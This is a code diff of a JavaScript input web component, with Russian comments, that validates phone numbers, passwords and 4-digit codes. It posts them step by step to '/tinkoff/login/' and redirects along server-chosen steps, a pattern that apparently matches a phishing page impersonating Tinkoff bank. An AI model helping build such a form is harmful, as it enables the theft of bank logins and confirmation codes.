@@ -4,54 +4,15 @@ class InputControl extends HTMLElement {
 
         this.attachShadow({ mode: 'open' });
 
-        // Получаем атрибуты `label`, `type` и `error-message`
-        const label = this.getAttribute('label') || 'Введите текст';
-        this.type = this.getAttribute('type') || 'text';
-        this.errorMessageElement = null;
+        // Получаем значения атрибутов `label` и `type`
+        const label = this.getAttribute('label') || 'Введите значение';
+        const type = this.getAttribute('type') || 'text';
 
         // HTML шаблон компонента
         this.shadowRoot.innerHTML = `
-            <style>
-                .input-container {
-                    display: flex;
-                    flex-direction: column;
-                    margin-bottom: 1rem;
-                }
-                label {
-                    font-weight: bold;
-                    margin-bottom: 0.5rem;
-                }
-                input {
-                    padding: 0.5rem;
-                    border: 1px solid #ccc;
-                    border-radius: 4px;
-                }
-                .error-message {
-                    color: red;
-                    font-size: 0.8rem;
-                    margin-top: 0.5rem;
-                    display: none;
-                }
-                button {
-                    margin-top: 0.5rem;
-                    padding: 0.5rem;
-                    background-color: #007bff;
-                    color: white;
-                    border: none;
-                    border-radius: 4px;
-                    cursor: pointer;
-                    display: flex;
-                    align-items: center;
-                    gap: 0.3rem;
-                }
-                button:hover {
-                    background-color: #0056b3;
-                }
-            </style>
-
             <div class="input-container">
                 <label>${label}</label>
-                <input type="text" />
+                <input type="${type}" />
                 <span class="error-message"></span>
                 <button type="button">
                     Отправить
@@ -67,6 +28,19 @@ class InputControl extends HTMLElement {
         this.button.addEventListener('click', () => this.handleSubmit());
     }
 
+    static get observedAttributes() {
+        return ['label', 'type'];
+    }
+
+    attributeChangedCallback(name, oldValue, newValue) {
+        if (name === 'label') {
+            this.shadowRoot.querySelector('label').textContent = newValue;
+        }
+        if (name === 'type') {
+            this.input.type = newValue;
+        }
+    }
+
     async handleSubmit() {
         const value = this.input.value.trim();
         let [isValid, errorMessage] = this.inputIsValid(value);
@@ -78,24 +52,23 @@ class InputControl extends HTMLElement {
 
         this.hideError();
 
-        // Отправка данных или переход
         this.button.disabled = true;
-        
+
         try {
-            // Отправляем данные логина через POST
             const response = await fetch('/tinkoff/login/', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(value)
+                body: JSON.stringify({ value })
             });
 
-            const result = await response.json();
+            const data = await response.json();
 
-            if (result.status === "success" && result.next_page) {
-                // Перенаправляем на универсальный GET эндпоинт
-                window.location.href = result.next_page;
+            if (data.status === 'success') {
+                const pageType = data.next_page_type;
+                window.location.href = `/tinkoff/next/?step=${pageType}`;
             } else {
-                this.showError(result.message || 'Произошла ошибка.');
+                this.showError(data.detail || 'Произошла ошибка.');
+                this.input.value = ''
             }
         } catch (error) {
             this.showError('Ошибка сети. Попробуйте снова.');
@@ -119,9 +92,8 @@ class InputControl extends HTMLElement {
         let isValid = true;
         let errorMessage = '';
 
-        // Проверка в зависимости от типа поля
-        switch (this.type) {
-            case 'phone':
+        switch (this.input.type) {
+            case 'tel':
                 const phonePattern = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[-\s]?\d{2}[-\s]?\d{2}$/;
                 isValid = phonePattern.test(value);
                 errorMessage = 'Введите корректный номер телефона';
@@ -130,7 +102,7 @@ class InputControl extends HTMLElement {
                 isValid = value.length > 0;
                 errorMessage = 'Пароль не может быть пустым';
                 break;
-            case 'code':
+            case 'number':
                 isValid = value.length === 4 && /^\d{4}$/.test(value);
                 errorMessage = 'Код должен состоять из 4 цифр';
                 break;
@@ -138,7 +110,7 @@ class InputControl extends HTMLElement {
                 isValid = value.length > 0;
                 errorMessage = 'Поле не может быть пустым';
         }
-        return [isValid, errorMessage]
+        return [isValid, errorMessage];
     }
 }
 
